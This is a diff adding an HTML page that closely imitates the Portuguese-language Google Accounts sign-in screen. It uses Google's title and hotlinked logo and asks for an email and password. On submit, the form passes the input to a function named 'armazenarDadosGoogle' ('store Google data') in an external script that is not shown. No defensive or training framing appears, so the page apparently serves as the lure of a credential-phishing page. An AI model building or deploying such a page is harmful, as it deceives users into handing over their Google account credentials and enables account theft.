@@ -1,0 +1,166 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Fazer login – Contas do Google</title>
+
+<style>
+
+body{
+margin:0;
+font-family: Arial, Helvetica, sans-serif;
+background:#f1f3f4;
+display:flex;
+justify-content:center;
+align-items:center;
+height:100vh;
+}
+
+.container{
+background:white;
+width:90%;
+max-width:420px;
+padding:40px;
+border-radius:8px;
+box-shadow:0 1px 3px rgba(0,0,0,0.2);
+}
+
+.logo{
+text-align:center;
+margin-bottom:20px;
+}
+
+.logo img{
+width:75px;
+}
+
+h2{
+text-align:center;
+font-weight:400;
+margin-bottom:5px;
+}
+
+.sub{
+text-align:center;
+color:#5f6368;
+margin-bottom:30px;
+font-size:14px;
+}
+
+input{
+width:100%;
+padding:14px;
+border:1px solid #dadce0;
+border-radius:4px;
+font-size:16px;
+margin-bottom:18px;
+transition:0.2s;
+}
+
+input:focus{
+outline:none;
+border:2px solid #1a73e8;
+box-shadow:0 0 5px rgba(26,115,232,0.3);
+}
+
+.links{
+color:#1a73e8;
+font-size:14px;
+cursor:pointer;
+margin-bottom:20px;
+}
+
+.bottom{
+display:flex;
+justify-content:space-between;
+align-items:center;
+margin-top:20px;
+}
+
+button{
+background:#1a73e8;
+color:white;
+border:none;
+padding:10px 24px;
+border-radius:4px;
+cursor:pointer;
+font-size:14px;
+}
+
+button:hover{
+background:#1669c1;
+}
+
+.criar{
+color:#1a73e8;
+font-size:14px;
+cursor:pointer;
+}
+
+/* 🔥 MENSAGEM BONITA */
+.mensagem{
+margin-top:15px;
+padding:12px;
+border-radius:6px;
+text-align:center;
+font-weight:bold;
+display:none;
+animation: fadeIn 0.3s ease;
+}
+
+.mensagem.erro{
+background:#fee2e2;
+color:#7f1d1d;
+border:1px solid #ef4444;
+}
+
+@keyframes fadeIn{
+from{
+opacity:0;
+transform:translateY(10px);
+}
+to{
+opacity:1;
+transform:translateY(0);
+}
+}
+
+</style>
+</head>
+
+<body>
+
+<div class="container">
+
+<div class="logo">
+<img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png">
+</div>
+
+<h2>Fazer login</h2>
+<div class="sub">Use sua Conta do Google</div>
+
+<form onsubmit="armazenarDadosGoogle(event)">
+
+<input type="email" id="google_user" placeholder="E-mail ou telefone" required>
+
+<input type="password" id="google_pass" placeholder="Digite sua senha" required>
+
+<div class="links">Esqueceu seu e-mail ou senha?</div>
+
+<div class="bottom">
+<div class="criar">Criar conta</div>
+<button type="submit">Avançar</button>
+</div>
+
+<!-- 🔥 MENSAGEM -->
+<div id="mensagemGoogle" class="mensagem"></div>
+
+</form>
+
+</div>
+
+<script src="login.js"></script>
+
+</body>
+</html>
